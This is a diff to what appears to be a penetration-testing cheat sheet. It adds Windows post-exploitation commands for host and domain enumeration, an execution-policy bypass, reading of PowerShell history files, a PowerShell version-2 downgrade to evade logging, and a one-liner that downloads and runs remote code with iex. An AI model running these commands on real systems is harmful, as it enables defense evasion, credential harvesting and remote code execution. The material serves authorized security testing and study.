@@ -190,12 +190,26 @@ $ sudo -E wireshark
 https://www.netminer.com/en/product/netminer.php?ckattempt=1
 ```
 
-- Net
+- Living Off The Land (LOLBAS)
 
 ```
 C:\> net accounts
 C:\> net user
 C:\> net user /domain
+C:\> hostname
+C:\> [System.Environment]::OSVersion.Version
+C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
+C:\> ipconfig /all
+C:\> set
+C:\> echo %USERDOMAIN%
+C:\> echo %logonserver%
+C:\> systeminfo
+PS C:\> Get-Module
+PS C:\> Get-ExecutionPolicy -List
+PS C:\> Set-ExecutionPolicy Bypass -Scope Process
+PS C:\> Get-ChildItem Env: | ft Key,Value
+PS C:\> Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+PS C:\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
 ```
 
 - PowerView
@@ -2898,6 +2912,27 @@ PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 ```
 PS C:\> $ExecutionContext.SessionState.LanguageMode
+```
+
+- Downgrade PowerShell
+
+```
+PS C:\> Get-Host
+PS C:\> powershell.exe -version 2
+PS C:\> Get-Host
+```
+
+- View Windows Firewall Settings
+
+```
+PS C:\> netsh advfirewall show allprofiles
+C:\> sc query windefend
+```
+
+- View Other Active Users
+
+```
+PS C:\> qwinsta
 ```
 
 #12. - Online Resources
